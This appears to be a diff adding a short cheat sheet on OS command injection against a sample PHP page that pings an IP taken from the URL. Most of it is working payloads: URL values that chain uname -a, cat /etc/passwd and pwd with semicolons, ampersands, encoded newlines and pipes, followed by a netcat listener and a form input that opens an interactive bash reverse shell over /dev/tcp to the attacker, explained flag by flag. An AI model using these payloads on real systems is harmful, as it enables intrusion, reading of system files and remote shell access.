@@ -1,0 +1,33 @@
+Sample Site that uses ping and the IP provided in the URL
+http://site.org/example.php?ip=127.0.0.1
+
+	http://site.org/example.php?ip=127.0.0.1; uname -a
+	http://site.org/example.php?ip=127.0.0.1 && uname -a
+	http://site.org/example.php?ip=127.0.0.1%26%26cat /etc/passwd
+		%26 is an &
+	http://site.org/example.php?ip=127.0.0.1%0a pwd
+		%0a is an encoded "new line"  Works great!
+	Using netcat:
+		nc site.org 80
+			GET /example.php?ip=127.0.0.1|uname+-a HTTP/1.0
+
+
+Use command injection to get a remote bash session
+Attacker starts netcat listener
+	nc -n -v -l -p 2222
+Then in the user input form enter the following
+	test; /bin/bash -i > /dev/tcp/<ip of nc>/2222 0<&1 2>&1; echo hello
+		test;		data that the input form would normally use;
+				i.e. username, password, etc
+		/bin/bash -i	invoke bash in interactive mode
+		> /dev/tcp	redirect output of bash to ip on port 2222 via
+				/dev/tcp.  There is a / between ip and port
+		0<&1		tells the system to duplicate the standard
+				output file descriptor (&1) and connect it to
+				the standard in of bash
+		2>&1		standard error
+		;echo hello	Just acting as a place holder in case the 1st
+				two command don't actually work.  If you notice
+				the 3rd command works but the other 2nd didn't
+				you can compose your injection so the 3rd one
+				will work...if necessary
